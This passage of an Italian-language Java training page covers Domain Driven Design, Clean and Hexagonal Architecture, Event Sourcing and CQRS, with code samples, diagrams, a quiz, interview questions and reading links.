                    <p><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank">OWASP Testing Guide</a></p>
                </div>

                <div class="info-box">
                    <h4>Authentication & Authorization</h4>
                    <p><a href="https://jwt.io/introduction" target="_blank">JWT.io Introduction</a></p>
                    <p><a href="https://oauth.net/2/" target="_blank">OAuth 2.0</a></p>
                    <p><a href="https://openid.net/connect/" target="_blank">OpenID Connect</a></p>
                    <p><a href="https://www.baeldung.com/spring-security-oauth" target="_blank">Baeldung: Spring Security OAuth</a></p>
                    <p><a href="https://auth0.com/docs" target="_blank">Auth0 Documentation</a></p>
                </div>

                <div class="info-box">
                    <h4>Secure Coding</h4>
                    <p><a href="https://www.baeldung.com/spring-security-csrf" target="_blank">Baeldung: CSRF Protection</a></p>
                    <p><a href="https://snyk.io/learn/" target="_blank">Snyk Learn</a> - Security education</p>
                    <p><a href="https://portswigger.net/web-security" target="_blank">PortSwigger Web Security Academy</a></p>
                </div>

                <div class="info-box">
                    <h4>Secrets Management</h4>
                    <p><a href="https://developer.hashicorp.com/vault/docs" target="_blank">HashiCorp Vault</a></p>
                    <p><a href="https://kubernetes.io/docs/concepts/configuration/secret/" target="_blank">Kubernetes Secrets</a></p>
                    <p><a href="https://aws.amazon.com/secrets-manager/" target="_blank">AWS Secrets Manager</a></p>
                </div>
            </section>

            <!-- ==================== MODULO 11: DDD & CLEAN ARCHITECTURE ==================== -->

            <header class="module-header" id="modulo11">
                <span class="module-tag">Modulo 11</span>
                <h1>DDD & Clean Architecture</h1>
                <p>Domain Driven Design, Hexagonal Architecture, Event Sourcing e CQRS</p>
            </header>

            <!-- DDD Section -->
            <section class="section" id="modulo11-ddd">
                <h2>Domain Driven Design (DDD)</h2>

                <p><strong>Domain Driven Design</strong> è un approccio allo sviluppo software che mette il dominio di business al centro dell'architettura. Invece di partire dal database o dall'UI, parti dalla comprensione profonda del problema di business.</p>

                <h3>Ubiquitous Language</h3>

                <p>Il <strong>Ubiquitous Language</strong> è un linguaggio condiviso tra sviluppatori e domain experts. Ogni termine ha un significato preciso usato ovunque: codice, documentazione, conversazioni.</p>

                <pre><code class="language-java">// ❌ SENZA Ubiquitous Language
class DataProcessor {
    void processItem(Item item, int statusCode) {
        if (statusCode == 1) { ... }  // Cosa significa 1?
    }
}

// ✅ CON Ubiquitous Language
class OrderService {
    void shipOrder(Order order) {
        order.markAsShipped();  // Linguaggio del dominio
    }
}

enum OrderStatus {
    PENDING_PAYMENT,
    PAYMENT_CONFIRMED,
    SHIPPED,
    DELIVERED,
    CANCELLED
}</code></pre>

                <h3>Bounded Contexts</h3>

                <p>Un <strong>Bounded Context</strong> è un confine esplicito dentro il quale un modello di dominio è valido. Lo stesso termine può avere significati diversi in contesti diversi.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        BOUNDED CONTEXTS - E-Commerce                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌─────────────────────┐    ┌─────────────────────┐    ┌─────────────────┐ │
│  │   SALES CONTEXT     │    │  INVENTORY CONTEXT  │    │ SHIPPING CONTEXT│ │
│  │                     │    │                     │    │                 │ │
│  │  "Product" =        │    │  "Product" =        │    │  "Product" =    │ │
│  │   - name            │    │   - SKU             │    │   - weight      │ │
│  │   - price           │    │   - quantity        │    │   - dimensions  │ │
│  │   - description     │    │   - warehouse       │    │   - fragile     │ │
│  │   - images          │    │   - reorderLevel    │    │                 │ │
│  │                     │    │                     │    │                 │ │
│  │  "Customer" =       │    │  (no Customer)      │    │  "Customer" =   │ │
│  │   - name            │    │                     │    │   - address     │ │
│  │   - email           │    │                     │    │   - phone       │ │
│  │   - preferences     │    │                     │    │                 │ │
│  └──────────┬──────────┘    └──────────┬──────────┘    └────────┬────────┘ │
│             │                          │                        │          │
│             └──────────────────────────┼────────────────────────┘          │
│                          Context Mapping (Integration)                      │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Building Blocks del DDD</h3>

                <h4>Entity vs Value Object</h4>

                <pre><code class="language-java">// ENTITY: ha identità, può cambiare stato
// Due ordini con stesso contenuto sono DIVERSI se hanno ID diverso
@Entity
public class Order {
    @Id
    private OrderId id;  // Identità
    private OrderStatus status;
    private List&lt;OrderLine&gt; lines;

    // Può cambiare stato
    public void addItem(Product product, int quantity) { ... }
    public void markAsShipped() { this.status = OrderStatus.SHIPPED; }

    // Uguaglianza basata su ID
    @Override
    public boolean equals(Object o) {
        return o instanceof Order other && this.id.equals(other.id);
    }
}

// VALUE OBJECT: immutabile, definito dai suoi attributi
// Due Money con stesso amount e currency sono UGUALI
public record Money(BigDecimal amount, Currency currency) {
    public Money {
        if (amount.compareTo(BigDecimal.ZERO) &lt; 0) {
            throw new IllegalArgumentException("Amount cannot be negative");
        }
    }

    public Money add(Money other) {
        if (!this.currency.equals(other.currency)) {
            throw new IllegalArgumentException("Cannot add different currencies");
        }
        return new Money(this.amount.add(other.amount), this.currency);
    }

    // Uguaglianza basata sui valori (automatico con record)
}

// Altro Value Object
public record Address(String street, String city, String zipCode, String country) {
    // Immutabile, uguaglianza per valore
}</code></pre>

                <h4>Aggregate e Aggregate Root</h4>

                <p>Un <strong>Aggregate</strong> è un cluster di oggetti trattati come unità per le modifiche. L'<strong>Aggregate Root</strong> è l'unico punto di accesso all'aggregate.</p>

                <pre><code class="language-java">// Order è l'Aggregate Root
// OrderLine esiste solo dentro Order
public class Order {  // Aggregate Root
    private OrderId id;
    private CustomerId customerId;
    private List&lt;OrderLine&gt; lines = new ArrayList&lt;&gt;();  // Parte dell'aggregate
    private Money total;

    // ✅ Le modifiche passano SEMPRE dall'Aggregate Root
    public void addItem(ProductId productId, int quantity, Money price) {
        // Invarianti di business qui
        if (this.status != OrderStatus.DRAFT) {
            throw new IllegalStateException("Cannot modify non-draft order");
        }

        var existingLine = findLine(productId);
        if (existingLine.isPresent()) {
            existingLine.get().increaseQuantity(quantity);
        } else {
            lines.add(new OrderLine(productId, quantity, price));
        }

        recalculateTotal();
    }

    // ❌ MAI esporre la lista interna
    // public List&lt;OrderLine&gt; getLines() { return lines; }

    // ✅ Esponi una vista immutabile
    public List&lt;OrderLine&gt; getLines() {
        return Collections.unmodifiableList(lines);
    }
}

// OrderLine NON è accessibile direttamente dall'esterno
class OrderLine {  // Parte dell'aggregate, NON root
    private ProductId productId;
    private int quantity;
    private Money unitPrice;

    void increaseQuantity(int amount) {
        this.quantity += amount;
    }
}</code></pre>

                <h4>Repository Pattern</h4>

                <pre><code class="language-java">// Repository: astrazione per persistenza degli Aggregate
public interface OrderRepository {
    Order findById(OrderId id);
    void save(Order order);
    void delete(OrderId id);

    // Query specifiche del dominio
    List&lt;Order&gt; findByCustomer(CustomerId customerId);
    List&lt;Order&gt; findPendingOrdersOlderThan(Duration duration);
}

// Implementazione con JPA
@Repository
class JpaOrderRepository implements OrderRepository {
    private final OrderJpaRepository jpaRepo;
    private final OrderMapper mapper;

    @Override
    public Order findById(OrderId id) {
        return jpaRepo.findById(id.value())
            .map(mapper::toDomain)
            .orElseThrow(() -> new OrderNotFoundException(id));
    }

    @Override
    public void save(Order order) {
        var entity = mapper.toEntity(order);
        jpaRepo.save(entity);
    }
}</code></pre>

                <h4>Domain Events</h4>

                <pre><code class="language-java">// Domain Event: qualcosa di importante che è successo nel dominio
public record OrderPlaced(
    OrderId orderId,
    CustomerId customerId,
    Money total,
    Instant occurredAt
) implements DomainEvent {}

public record OrderShipped(
    OrderId orderId,
    TrackingNumber trackingNumber,
    Instant occurredAt
) implements DomainEvent {}

// L'Aggregate Root pubblica eventi
public class Order {
    private List&lt;DomainEvent&gt; domainEvents = new ArrayList&lt;&gt;();

    public void place() {
        if (lines.isEmpty()) {
            throw new IllegalStateException("Cannot place empty order");
        }
        this.status = OrderStatus.PLACED;
        domainEvents.add(new OrderPlaced(id, customerId, total, Instant.now()));
    }

    public List&lt;DomainEvent&gt; getDomainEvents() {
        return List.copyOf(domainEvents);
    }

    public void clearDomainEvents() {
        domainEvents.clear();
    }
}

// Event handler in altro bounded context
@Component
class InventoryEventHandler {
    @EventListener
    public void on(OrderPlaced event) {
        // Riserva gli item in inventario
        inventoryService.reserveItems(event.orderId());
    }
}</code></pre>
            </section>

            <!-- Clean Architecture Section -->
            <section class="section" id="modulo11-clean">
                <h2>Clean Architecture & Hexagonal</h2>

                <p>La <strong>Clean Architecture</strong> (Uncle Bob) e l'<strong>Hexagonal Architecture</strong> (Ports & Adapters) condividono lo stesso principio: il dominio al centro, le dipendenze puntano verso l'interno.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        CLEAN ARCHITECTURE                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│                    ┌─────────────────────────────────┐                      │
│                    │     FRAMEWORKS & DRIVERS        │  ← Web, DB, UI       │
│                    │     (Infrastructure)            │                      │
│                    │  ┌─────────────────────────┐    │                      │
│                    │  │   INTERFACE ADAPTERS    │    │  ← Controllers,      │
│                    │  │   (Adapters)            │    │    Gateways,         │
│                    │  │  ┌─────────────────┐    │    │    Presenters        │
│                    │  │  │   USE CASES     │    │    │                      │
│                    │  │  │  (Application)  │    │    │  ← Business rules    │
│                    │  │  │  ┌─────────┐    │    │    │                      │
│                    │  │  │  │ ENTITIES│    │    │    │  ← Enterprise        │
│                    │  │  │  │ (Domain)│    │    │    │    business rules    │
│                    │  │  │  └─────────┘    │    │    │                      │
│                    │  │  └─────────────────┘    │    │                      │
│                    │  └─────────────────────────┘    │                      │
│                    └─────────────────────────────────┘                      │
│                                                                              │
│  DEPENDENCY RULE: Le dipendenze puntano solo VERSO L'INTERNO               │
│  Il Domain non conosce Spring, JPA, HTTP, etc.                              │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Hexagonal Architecture (Ports & Adapters)</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        HEXAGONAL ARCHITECTURE                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│        DRIVING ADAPTERS                           DRIVEN ADAPTERS           │
│        (Input)                                    (Output)                  │
│                                                                              │
│  ┌─────────────┐       ┌─────────────────────┐       ┌─────────────┐       │
│  │ REST        │──────▶│     APPLICATION     │──────▶│ PostgreSQL  │       │
│  │ Controller  │       │                     │       │ Repository  │       │
│  └─────────────┘       │  ┌───────────────┐  │       └─────────────┘       │
│                        │  │               │  │                              │
│  ┌─────────────┐       │  │    DOMAIN     │  │       ┌─────────────┐       │
│  │ GraphQL     │──────▶│  │               │  │──────▶│ Kafka       │       │
│  │ Resolver    │       │  │   (Entities,  │  │       │ Publisher   │       │
│  └─────────────┘       │  │  Value Objects│  │       └─────────────┘       │
│                        │  │   Services)   │  │                              │
│  ┌─────────────┐       │  │               │  │       ┌─────────────┐       │
│  │ CLI         │──────▶│  └───────────────┘  │──────▶│ Email       │       │
│  │ Command     │       │                     │       │ Service     │       │
│  └─────────────┘       │  Uses Ports         │       └─────────────┘       │
│                        │  (interfaces)       │                              │
│        ▲               └─────────────────────┘               ▲              │
│        │                                                     │              │
│   INBOUND PORTS                                    OUTBOUND PORTS          │
│   (Use Cases)                                      (Repository,            │
│                                                    EventPublisher)         │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// ════════════════════════════════════════════════════════════════
// DOMAIN LAYER (centro - nessuna dipendenza esterna)
// ════════════════════════════════════════════════════════════════

// Entità di dominio pura
public class Order {
    private OrderId id;
    private List&lt;OrderLine&gt; lines;
    private OrderStatus status;

    public void place() { ... }
    public void ship(TrackingNumber tracking) { ... }
}

// ════════════════════════════════════════════════════════════════
// APPLICATION LAYER (Use Cases)
// ════════════════════════════════════════════════════════════════

// INBOUND PORT: definisce cosa l'applicazione può fare
public interface PlaceOrderUseCase {
    OrderId execute(PlaceOrderCommand command);
}

public record PlaceOrderCommand(
    CustomerId customerId,
    List&lt;OrderItemCommand&gt; items
) {}

// USE CASE implementation
@Service
@Transactional
public class PlaceOrderService implements PlaceOrderUseCase {
    private final OrderRepository orderRepository;      // Outbound port
    private final CustomerRepository customerRepository;
    private final EventPublisher eventPublisher;        // Outbound port

    @Override
    public OrderId execute(PlaceOrderCommand command) {
        Customer customer = customerRepository.findById(command.customerId())
            .orElseThrow(() -> new CustomerNotFoundException(command.customerId()));

        Order order = Order.create(customer.getId());
        command.items().forEach(item ->
            order.addItem(item.productId(), item.quantity(), item.price())
        );
        order.place();

        orderRepository.save(order);
        order.getDomainEvents().forEach(eventPublisher::publish);

        return order.getId();
    }
}

// OUTBOUND PORTS (interfaces definite nel domain/application layer)
public interface OrderRepository {
    Optional&lt;Order&gt; findById(OrderId id);
    void save(Order order);
}

public interface EventPublisher {
    void publish(DomainEvent event);
}

// ════════════════════════════════════════════════════════════════
// INFRASTRUCTURE LAYER (Adapters)
// ════════════════════════════════════════════════════════════════

// INBOUND ADAPTER: REST Controller
@RestController
@RequestMapping("/orders")
public class OrderController {
    private final PlaceOrderUseCase placeOrderUseCase;  // Dipende dal PORT

    @PostMapping
    public ResponseEntity&lt;OrderResponse&gt; placeOrder(@RequestBody PlaceOrderRequest request) {
        var command = new PlaceOrderCommand(
            new CustomerId(request.customerId()),
            request.items().stream().map(this::toCommand).toList()
        );
        OrderId orderId = placeOrderUseCase.execute(command);
        return ResponseEntity.created(URI.create("/orders/" + orderId)).build();
    }
}

// OUTBOUND ADAPTER: JPA Repository
@Repository
public class JpaOrderRepository implements OrderRepository {
    private final OrderJpaRepository jpaRepo;
    private final OrderMapper mapper;

    @Override
    public void save(Order order) {
        jpaRepo.save(mapper.toEntity(order));
    }
}

// OUTBOUND ADAPTER: Kafka Publisher
@Component
public class KafkaEventPublisher implements EventPublisher {
    private final KafkaTemplate&lt;String, Object&gt; kafka;

    @Override
    public void publish(DomainEvent event) {
        kafka.send("domain-events", event);
    }
}</code></pre>
            </section>

            <!-- CQRS & Event Sourcing Section -->
            <section class="section" id="modulo11-cqrs">
                <h2>Event Sourcing & CQRS</h2>

                <h3>Event Sourcing</h3>

                <p>In <strong>Event Sourcing</strong>, invece di salvare lo stato corrente, salvi la sequenza di eventi che hanno portato a quello stato. Lo stato è derivato riapplicando gli eventi.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        EVENT SOURCING                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  TRADITIONAL (State)              EVENT SOURCING                            │
│  ─────────────────────            ──────────────────                         │
│                                                                              │
│  Account Table:                   Event Store:                              │
│  ┌─────────────────┐              ┌──────────────────────────────────────┐  │
│  │ id: 123         │              │ 1. AccountCreated(id=123, name=John) │  │
│  │ balance: 150    │    vs        │ 2. MoneyDeposited(id=123, amount=200)│  │
│  │ name: John      │              │ 3. MoneyWithdrawn(id=123, amount=50) │  │
│  └─────────────────┘              └──────────────────────────────────────┘  │
│                                                                              │
│  "Cosa c'è adesso"                "Cosa è successo" → ricostruisci stato    │
│                                                                              │
│  Pro Event Sourcing:                                                        │
│  ✓ Audit trail completo (chi ha fatto cosa, quando)                        │
│  ✓ Time travel: ricostruisci stato a qualsiasi punto                       │
│  ✓ Debug: replay eventi per riprodurre bug                                 │
│  ✓ Event-driven architecture naturale                                       │
│                                                                              │
│  Contro:                                                                     │
│  ✗ Complessità (eventual consistency, versioning eventi)                   │
│  ✗ Query complesse richiedono proiezioni (→ CQRS)                          │
│  ✗ Curva di apprendimento                                                   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// Aggregate con Event Sourcing
public class Account {
    private AccountId id;
    private String name;
    private Money balance;
    private List&lt;DomainEvent&gt; uncommittedEvents = new ArrayList&lt;&gt;();

    // Ricostruisci da eventi
    public static Account fromEvents(List&lt;DomainEvent&gt; events) {
        Account account = new Account();
        events.forEach(account::apply);
        return account;
    }

    // Comandi producono eventi
    public void deposit(Money amount) {
        if (amount.isNegative()) {
            throw new IllegalArgumentException("Amount must be positive");
        }
        applyAndRecord(new MoneyDeposited(id, amount, Instant.now()));
    }

    public void withdraw(Money amount) {
        if (balance.lessThan(amount)) {
            throw new InsufficientFundsException(id, balance, amount);
        }
        applyAndRecord(new MoneyWithdrawn(id, amount, Instant.now()));
    }

    // Applica evento allo stato
    private void apply(DomainEvent event) {
        switch (event) {
            case AccountCreated e -> {
                this.id = e.accountId();
                this.name = e.name();
                this.balance = Money.ZERO;
            }
            case MoneyDeposited e -> this.balance = balance.add(e.amount());
            case MoneyWithdrawn e -> this.balance = balance.subtract(e.amount());
            default -> throw new IllegalArgumentException("Unknown event: " + event);
        }
    }

    private void applyAndRecord(DomainEvent event) {
        apply(event);
        uncommittedEvents.add(event);
    }

    public List&lt;DomainEvent&gt; getUncommittedEvents() {
        return List.copyOf(uncommittedEvents);
    }
}</code></pre>

                <h3>CQRS (Command Query Responsibility Segregation)</h3>

                <p><strong>CQRS</strong> separa i modelli per scrittura (Command) e lettura (Query). Ogni lato può essere ottimizzato indipendentemente.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        CQRS PATTERN                                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│                              ┌─────────┐                                    │
│                              │ Client  │                                    │
│                              └────┬────┘                                    │
│                         ┌─────────┴─────────┐                               │
│                         │                   │                               │
│                    Commands              Queries                            │
│                    (writes)              (reads)                            │
│                         │                   │                               │
│                         ▼                   ▼                               │
│               ┌─────────────────┐   ┌─────────────────┐                    │
│               │ Command Handler │   │  Query Handler  │                    │
│               │   (Use Cases)   │   │   (Read Model)  │                    │
│               └────────┬────────┘   └────────┬────────┘                    │
│                        │                     │                              │
│                        ▼                     ▼                              │
│               ┌─────────────────┐   ┌─────────────────┐                    │
│               │  Write Model    │   │   Read Model    │  ← Ottimizzato     │
│               │  (Domain/Event  │   │  (Proiezioni,   │    per query       │
│               │   Store)        │   │   denormalizzato)│                   │
│               └────────┬────────┘   └─────────────────┘                    │
│                        │                     ▲                              │
│                        │     Events          │                              │
│                        └─────────────────────┘                              │
│                          (Sincronizzazione)                                 │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// COMMAND SIDE
public record PlaceOrderCommand(CustomerId customerId, List&lt;Item&gt; items) {}

@Service
public class OrderCommandHandler {
    private final EventStore eventStore;

    public void handle(PlaceOrderCommand cmd) {
        Order order = Order.create(cmd.customerId());
        cmd.items().forEach(i -> order.addItem(i.productId(), i.quantity()));
        order.place();

        // Salva eventi, non stato
        eventStore.append(order.getId(), order.getUncommittedEvents());
    }
}

// QUERY SIDE - Read Model ottimizzato
@Document(collection = "order_summaries")
public class OrderSummaryReadModel {
    private String orderId;
    private String customerName;  // Denormalizzato!
    private BigDecimal total;
    private String status;
    private int itemCount;
    private Instant placedAt;
}

// Proiezione: ascolta eventi e aggiorna read model
@Component
public class OrderSummaryProjection {
    private final OrderSummaryRepository readRepo;
    private final CustomerRepository customerRepo;

    @EventListener
    public void on(OrderPlaced event) {
        Customer customer = customerRepo.findById(event.customerId());

        OrderSummaryReadModel summary = new OrderSummaryReadModel();
        summary.setOrderId(event.orderId().value());
        summary.setCustomerName(customer.getName());  // Denormalizza
        summary.setTotal(event.total().amount());
        summary.setStatus("PLACED");
        summary.setPlacedAt(event.occurredAt());

        readRepo.save(summary);
    }

    @EventListener
    public void on(OrderShipped event) {
        readRepo.updateStatus(event.orderId(), "SHIPPED");
    }
}

// Query handler: legge dal read model (veloce, ottimizzato)
@Service
public class OrderQueryHandler {
    private final OrderSummaryRepository readRepo;

    public List&lt;OrderSummaryReadModel&gt; getOrdersByCustomer(String customerName) {
        // Query diretta, no JOIN, denormalizzato
        return readRepo.findByCustomerName(customerName);
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>CQRS/Event Sourcing: Quando Usarli?</h4>
                    <p><strong>Usali quando</strong>: Domini complessi con regole di business ricche, audit trail è requisito, workload read/write molto diversi, team esperti. <strong>NON usarli per</strong>: CRUD semplice, team piccoli/inesperti, MVP. La complessità aggiunta deve essere giustificata dal valore di business.</p>
                </div>
            </section>

            <!-- Quiz Section Modulo 11 -->
            <section class="quiz-section" id="modulo11-quiz">
                <h2>Interactive Challenge Quiz - Modulo 11</h2>

                <!-- Question 51 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q1.</span> In DDD, qual è la differenza principale tra Entity e Value Object?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q51" id="q51a" value="a">
                            <label for="q51a">Entity è mutabile, Value Object è immutabile</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q51" id="q51b" value="b">
                            <label for="q51b">Entity ha identità unica, Value Object è definito dai suoi attributi</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q51" id="q51c" value="c">
                            <label for="q51c">Entity è persistita in DB, Value Object no</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q51" id="q51d" value="d">
                            <label for="q51d">Entity ha metodi, Value Object ha solo dati</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q51')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q51"></div>
                </div>

                <!-- Question 52 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q2.</span> Perché le dipendenze in Clean Architecture puntano verso l'interno?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q52" id="q52a" value="a">
                            <label for="q52a">Per migliorare le performance del sistema</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q52" id="q52b" value="b">
                            <label for="q52b">Perché il database è il componente più importante</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q52" id="q52c" value="c">
                            <label for="q52c">Per proteggere il dominio da cambiamenti nei dettagli implementativi</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q52" id="q52d" value="d">
                            <label for="q52d">Per facilitare il deployment in microservizi</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q52')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q52"></div>
                </div>

                <!-- Question 53 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q3.</span> In Event Sourcing, come ricostruisci lo stato corrente di un Aggregate?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q53" id="q53a" value="a">
                            <label for="q53a">Riapplichi tutti gli eventi dall'inizio in ordine cronologico</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q53" id="q53b" value="b">
                            <label for="q53b">Leggi l'ultimo snapshot dal database</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q53" id="q53c" value="c">
                            <label for="q53c">Fai una query SQL con i filtri appropriati</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q53" id="q53d" value="d">
                            <label for="q53d">Deserializzi il JSON salvato nell'event store</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q53')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q53"></div>
                </div>

                <!-- Question 54 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q4.</span> In CQRS, perché il Read Model può essere denormalizzato?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q54" id="q54a" value="a">
                            <label for="q54a">Perché i dati sono di sola lettura, non serve integrità referenziale</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q54" id="q54b" value="b">
                            <label for="q54b">Perché le query sono meno importanti dei comandi</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q54" id="q54c" value="c">
                            <label for="q54c">Perché MongoDB non supporta normalizzazione</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q54" id="q54d" value="d">
                            <label for="q54d">Perché è separato dal Write Model e può essere ottimizzato per le query specifiche</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q54')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q54"></div>
                </div>

                <!-- Question 55 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q5.</span> Perché l'Aggregate Root è l'unico punto di accesso per modificare l'Aggregate?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q55" id="q55a" value="a">
                            <label for="q55a">Per ridurre il numero di classi nel sistema</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q55" id="q55b" value="b">
                            <label for="q55b">Per garantire che gli invarianti di business siano sempre rispettati</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q55" id="q55c" value="c">
                            <label for="q55c">Per migliorare le performance delle query</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q55" id="q55d" value="d">
                            <label for="q55d">Perché JPA richiede una singola Entity root</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q55')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q55"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 11 -->
            <section class="section" id="modulo11-questions">
                <h2>Domande da Colloquio - Modulo 11</h2>

                <div class="info-box">
                    <h4>Q: Spiega cosa sono i Bounded Context e perché sono importanti.</h4>
                    <p><strong>Risposta attesa:</strong> Un Bounded Context è un confine esplicito dove un modello di dominio è valido. Lo stesso termine può avere significati diversi in contesti diversi - "Product" nel Sales context ha prezzo e descrizione, nel Warehouse context ha SKU e posizione scaffale. Sono importanti perché: 1) Evitano un modello "god class" che cerca di rappresentare tutto. 2) Permettono a team diversi di lavorare indipendentemente. 3) Permettono scelte tecniche diverse per contesto. 4) Mappano naturalmente ai microservizi. I contesti comunicano tramite Context Mapping (ACL, Open Host, etc.).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Qual è la differenza tra Clean Architecture e Hexagonal Architecture?</h4>
                    <p><strong>Risposta attesa:</strong> Condividono lo stesso principio fondamentale: il dominio al centro, dipendenze verso l'interno. Clean Architecture (Uncle Bob) enfatizza i layer concentrici: Entities → Use Cases → Interface Adapters → Frameworks. Hexagonal (Ports & Adapters, Alistair Cockburn) enfatizza la simmetria: il dominio al centro con porte (interfacce) e adattatori (implementazioni) sia per input (driving) che output (driven). In pratica sono molto simili. La differenza principale è il vocabolario: Clean usa "layers", Hexagonal usa "ports/adapters".</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quando useresti Event Sourcing invece di CRUD tradizionale?</h4>
                    <p><strong>Risposta attesa:</strong> Event Sourcing quando: 1) Audit trail è un requisito (finanza, healthcare, legal). 2) Vuoi "time travel" - ricostruire stato a qualsiasi momento. 3) Il dominio è naturalmente event-driven. 4) Vuoi debugging avanzato (replay eventi). 5) Analytics storiche complesse. NON usare per: CRUD semplice, team senza esperienza, quando la complessità non è giustificata. Il costo è: eventual consistency, versioning eventi, gestione proiezioni. Può essere applicato solo ad alcuni aggregate, non a tutto il sistema.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come gestisci la consistenza tra Read e Write model in CQRS?</h4>
                    <p><strong>Risposta attesa:</strong> La consistenza è eventuale, non immediata. Il Write model salva eventi/stato, poi il Read model si aggiorna asincronamente (via eventi, message queue, o polling). Strategie: 1) Accettare eventual consistency (la UI può mostrare "processing"). 2) Read-your-writes: dopo un comando, la UI legge direttamente dal Write model per quella entità. 3) Polling con retry finché il Read model si aggiorna. 4) WebSocket/SSE per notificare quando il Read model è pronto. La latenza tipica è millisecondi-secondi. Per operazioni critiche, usa transazioni distribuite o saga pattern.</p>
                </div>
            </section>

            <!-- Links Modulo 11 -->
            <section class="section" id="modulo11-links">
                <h2>Link di Approfondimento - Modulo 11</h2>

                <div class="info-box">
                    <h4>Domain Driven Design</h4>
                    <p><a href="https://www.domainlanguage.com/ddd/" target="_blank">Eric Evans: DDD Reference</a> - Autore originale</p>
                    <p><a href="https://www.baeldung.com/spring-data-ddd" target="_blank">Baeldung: DDD with Spring</a></p>
                    <p><a href="https://martinfowler.com/bliki/DomainDrivenDesign.html" target="_blank">Martin Fowler: DDD</a></p>
                    <p><a href="https://www.eventstorming.com/" target="_blank">EventStorming</a> - Workshop technique per DDD</p>
                </div>

                <div class="info-box">
                    <h4>Clean & Hexagonal Architecture</h4>
                    <p><a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html" target="_blank">Uncle Bob: Clean Architecture</a></p>
                    <p><a href="https://alistair.cockburn.us/hexagonal-architecture/" target="_blank">Alistair Cockburn: Hexagonal Architecture</a></p>
                    <p><a href="https://www.baeldung.com/hexagonal-architecture-ddd-spring" target="_blank">Baeldung: Hexagonal with Spring</a></p>
                </div>

                <div class="info-box">
                    <h4>Event Sourcing & CQRS</h4>
                    <p><a href="https://martinfowler.com/eaaDev/EventSourcing.html" target="_blank">Martin Fowler: Event Sourcing</a></p>
                    <p><a href="https://martinfowler.com/bliki/CQRS.html" target="_blank">Martin Fowler: CQRS</a></p>
                    <p><a href="https://www.eventstore.com/event-sourcing" target="_blank">Event Store: Event Sourcing Basics</a></p>
                    <p><a href="https://axoniq.io/" target="_blank">Axon Framework</a> - CQRS/ES framework per Java</p>
                </div>

                <div class="info-box">
                    <h4>Libri Consigliati</h4>
                    <p><a href="https://www.amazon.com/Domain-Driven-Design-Tackling-Complexity-Software/dp/0321125215" target="_blank">Domain-Driven Design (Blue Book)</a> - Eric Evans</p>
